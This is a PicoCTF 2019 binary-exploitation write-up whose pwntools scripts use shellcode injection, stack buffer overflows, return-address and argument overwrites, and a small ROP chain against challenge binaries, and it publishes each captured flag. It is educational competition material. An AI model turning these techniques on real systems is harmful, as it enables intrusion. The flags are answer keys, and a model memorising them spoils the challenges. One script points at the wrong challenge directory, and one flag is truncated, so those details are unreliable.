# PicoCTF 2019(Binary Exploitation)

<small> [ Write-Up ] </small>
<hr>

<h5> handy-shellcode - 50pt </h5>
<p> This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5 on the shell server. Source. </p>

```py
#!/usr/bin/python
  
from pwn import *

user = '****'
pw = '****'

r = ssh(host='2019webshell1.picoctf.com',user=user, password=pw)
r.set_working_directory('/problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5')

p = r.process('./vuln')

shellcode = asm(shellcraft.i386.linux.sh())

p.sendline(shellcode)

p.sendline("cat flag.txt")

print p.recv()
```
<strong> Flag : picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487 </strong>
<hr>

<h5> practice-run-1 - 50pt </h5>
<p> You're going to need to know how to run programs if you're going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this program to receive a flag. </p>

```
./run_this
```
<strong> Flag : picoCTF{g3t_r3adY_2_r3v3r53} </strong>
<hr>

<h5> OverFlow 0 - 100pt </h5>
<p> This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in /problems/overflow-0_0_6d0c88d7d40bc281760b515cb6a4660a on the shell server. Source. </p>

```py
#!/usr/bin/python
  
from pwn import *

user = '****'
pw = '****'

r = ssh(host='2019webshell1.picoctf.com',user=user, password=pw)
r.set_working_directory('/problems/overflow-0_0_6d0c88d7d40bc281760b515cb6a4660a')

p = r.process('./vuln')

payload = "A"*136 # Memory + SFP + RET

p.sendline(payload)

print p.recv()
```
<strong> Flag : picoCTF{3asY_P3a5y0a131490} </strong>
<hr>

<h5> OverFlow 1 - 150pt </h5>
<p> You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_5_c76a107db1438c97f349f6b2d98fd6f8 on the shell server. Source. </p>

```py
#!/usr/bin/python
  
from pwn import *

user = '****'
pw = '****'

r = ssh(host='2019webshell1.picoctf.com',user=user, password=pw)
r.set_working_directory('/problems/overflow-1_5_c76a107db1438c97f349f6b2d98fd6f8')

p = r.process('./vuln')

e = ELF('./vuln')

flag = e.symbols['flag']

payload = "A"*76 # Memory + SFP
payload += p32(flag) # RET(flag)

p.sendline(payload)

print p.recv()
```
<strong> Flag : picoCTF{n0w_w3r3_ChaNg1ng_r3tURn532066483} </strong>
<hr>

<h5> NewOverFlow-1 - 200pt </h5>
<p> Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program. You can find it in /problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123 on the shell server. Source. </p>

```py
#!/usr/bin/python
  
from pwn import *

user = '****'
pw = '****'

r = ssh(host='2019webshell1.picoctf.com',user=user, password=pw)
r.set_working_directory('/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123')

p = r.process('./vuln')

e = ELF('./vuln')

buf = 0x4007e7
flag = e.symbols['flag']

payload = "A"*72
payload += p64(buf)
payload += p64(flag)

p.sendline(payload)

print p.recv()
```
<strong> Flag : picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_7a154fef} </strong>
<hr>

<h5> slippery-shellcode - 200pt </h5>
<p> This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1 on the shell server. Source. </p>

```py
#!/usr/bin/python
  
from pwn import *

user = '****'
pw = '****'

r = ssh(host='2019webshell1.picoctf.com',user=user, password=pw)
r.set_working_directory('/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123')

p = r.process('./vuln')

payload = "A"*256
payload += asm(shellcraft.i386.linux.sh())

p.sendline(payload)

p.interactive()
p.close()
```
<strong> Flag : picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6} </strong>
<hr>

<h5> NewOverFlow-2 - 250pt </h5>
<p> Okay now lets try mainpulating arguments. program. You can find it in /problems/newoverflow-2_3_3602cb64cd7f9512a10ae9139f8d8c2c on the shell server. Source. </p>

```py
#!/usr/bin/python
  
from pwn import *

user = '****'
pw = '****'

r = ssh(host='2019webshell1.picoctf.com',user=user, password=pw)
r.set_working_directory('/problems/newoverflow-2_3_3602cb64cd7f9512a10ae9139f8d8c2c')

p = r.process('./vuln')
e = ELF('./vuln')

main = e.symbols['main']
flag = e.symbols['flag']

payload = "A"*72
payload += p64(main)
payload += p64(flag)

p.sendline(payload)
p.sendline("test")

print p.recv()
```
<strong> Flag : picoCTF{r0p_1t_d0nT_st0p_1t_e51a1ea0} </strong>
<hr>

<h5> Overflow 2 - 250pt </h5>
<p> Now try overwriting arguments. Can you get the flag from this program? You can find it in /problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434 on the shell server. Source. </p>

```py

#!/usr/bin/python
  
from pwn import *

user = '****'
pw = '****'

r = ssh(host='2019webshell1.picoctf.com',user=user, password=pw)
r.set_working_directory('/problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434')

p = r.process('./vuln')
e = ELF('./vuln')

flag = e.symbols['flag']
arg1 = 0xDEADBEEF
arg2 = 0xC0DED00D

payload = "A"*188
payload += p32(flag)
payload += "A"*4
payload += p32(arg1)
payload += p32(arg2)

p.sendline(payload)

print p.recv()
```
<strong> Flag : picoCTF{arg5_and_r3turn598632d70} </strong>
<hr>

<h5> leap-frog - 300pt </h5>
<p> Can you jump your way to win in the following program and get the flag? You can find the program in /problems/leap-frog_2_b375af7c48bb686629be6dd928a46897 on the shell server? Source. </p>


```py
from pwn import *

user = '****'
pw = '****'

r = ssh(host='2019webshell1.picoctf.com',user=user, password=pw)
r.set_working_directory('/problems/leap-frog_2_b375af7c48bb686629be6dd928a46897')

p = r.process('./rop')
e = ELF('./rop')

gets_plt = e.plt['gets']
display_flag = e.symbols['display_flag']
win = 0x804a03d

payload = "A"*28 # 0x18 + 4
payload += p32(gets_plt)
payload += p32(display_flag)
payload += p32(win)

p.sendline(payload)
p.sendline("test")

print p.recv()
```
<strong> Flag : picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_322ee522} </strong>
<hr>